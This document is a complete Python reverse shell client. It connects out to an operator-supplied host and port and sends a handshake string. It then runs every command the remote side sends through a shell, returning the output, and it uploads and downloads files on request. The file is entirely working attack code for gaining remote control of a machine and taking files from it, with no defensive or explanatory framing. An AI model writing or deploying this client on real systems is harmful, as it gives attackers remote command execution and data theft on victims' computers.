import subprocess
import argparse
import socket
import sys


def connect_to_host(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def receive_file(filename, sock):
    with open(filename, "wb") as f:
        sock.send(b"ready_3X1T_5TATUS=")
        while(data := sock.recv(1024)):
            f.write(data)

def send_file(filename, sock):
    with open(filename, "rb") as f:
        while(chunk := f.read(1024)):
            sock.send(chunk)
        sock.send(b"_3X1T_5TATUS=0")

def execute_command(s):
    s.send(b"INIT:SunnyWeatherAhead:BlueSkies")
    while True:
        try:
            data = s.recv(1024)
        except ConnectionResetError:
            break
        print(data)
        if not data:
            break

        if b"wepa" in data:
            continue

        if data == b"HarmoniousJazzPlaysSoftly && echo _3X1T_5TATUS=$? || echo _3X1T_5TATUS=$?\n":
            s.send(b"1_3X1T_5TATUS=0")
            continue

        if b"sendingfile" in data:
            file = data.decode().split("sendingfile/")[1].split(" &&")[0].strip()
            receive_file(file, s)
            continue

        if b"gettingfile" in data:
            file = data.decode().split("gettingfile/")[1].split(" &&")[0].strip()
            send_file(file, s)
            continue


        proc = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()

        try:
            s.send(stdout_value)
        except BrokenPipeError:
            print("Connection closed by the host.")
            break

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("port")
    
    args = parser.parse_args()

    if len(sys.argv) < 3:
        parser.print_help(sys.stderr)
        sys.exit(1)
    s = connect_to_host(args.host, int(args.port))
    execute_command(s)

if __name__ == "__main__":
    main()